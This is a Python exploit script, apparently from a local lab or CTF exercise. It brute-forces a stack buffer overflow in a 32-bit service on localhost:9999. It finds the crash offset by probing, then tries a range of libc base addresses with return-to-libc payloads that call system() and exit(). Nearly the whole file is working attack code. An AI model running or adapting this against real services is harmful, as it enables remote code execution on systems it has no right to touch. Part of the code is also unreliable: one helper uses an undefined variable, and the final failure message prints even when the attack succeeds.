import struct
import time
import socket
from pwn import *

HOST = "localhost"
PORT = 9999

def generar_direcciones_libc(base_start= 0xf7cc0000, base_end=0xf7dc0000, page_size=0x1000):
    return [addr for addr in range(base_start, base_end, page_size)]
    
def send_payload(payload_data):
    """
    Send payload to target server and receive response.
    Args:
        payload_data: The data to send to the target
    """
    # Enviar binario directo a stdout (como un pipe a nc)
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((HOST, PORT))
        # print(f"Payload length: {len(payload_data)}")
        # Send payload
        sock.sendall(payload_data)
        # Receive response
        response = sock.recv(2048)
        if response:
            print(f"Response: {response}")
            return True
        # Wait before next attempt
    except socket.error as sock_error:
        print(f"Socket error: {sock_error}")
    finally:
        sock.close()
    return False

def calcular_offset():
    """
    Calculate the offset for the payload.
    """
    # This is a placeholder function. The actual implementation will depend on the target binary.
    # For example, you might want to use gdb or another tool to find the correct offset.
    i = 69
    while True:
        # print(f"Trying offset: {i}")
        PAYLOAD = b"A" * i
        RESPONSE = send_payload(PAYLOAD)
        if not RESPONSE:
            print(f"[+] GOT IT: offset = {i}")
            return i-1
        time.sleep(0.1)
        i += 1


def byte_for_byte_ebx_and_ebp(offset):
    payload = b"A" * offset
    for _ in range(0, 16):
        for i in range(0, 16):
            p = payload + bytes(i)
            print(f"Trying: {p}")
            response = send_payload(p)
            if response:
                print(f"[+] GOT IT: ebp = {hex(i)}")
                ebp_ebx += struct.pack("<I", i)
                payload = p
                break;
    return ebp_ebx

offset = calcular_offset()

libc = ELF("/usr/lib32/libc.so.6", checksec=False)  # usa la misma que el servidor
system_offset = libc.symbols["system"]
exit_offset = libc.symbols["exit"]
command_offset = next(libc.search(b"/etc/shells")) + 0x9  #  Te quedas con el "ls" de shells para ejecutar el comando

print(f"system_offset: {hex(system_offset)}")
print(f"exit_offset: {hex(exit_offset)}")
print(f"command_offset: {hex(command_offset)}")

libc_base_guesses = generar_direcciones_libc()

print(f"Guesses: {len(libc_base_guesses)}")

for base in libc_base_guesses:
    system = struct.pack("<I",(base + system_offset))
    exit_addr = struct.pack("<I",(base + exit_offset))
    command  = struct.pack("<I", (base + command_offset))

    PAYLOAD = b"A" * offset + b"BBBBBBBB"
    # PAYLOAD += ebp
    PAYLOAD += system
    PAYLOAD += exit_addr
    PAYLOAD += command + b"\x00"

    print(f"Base: {hex(base)} - System: {hex(base + system_offset)} - exit: {hex(base + exit_offset)} - command: {hex(base + command_offset)}")

    RESPONSE = send_payload(PAYLOAD)

    if RESPONSE:
        print(f"[+] GOT IT: base = {base}")
    time.sleep(0.1)
print("[+] Finished wihout success")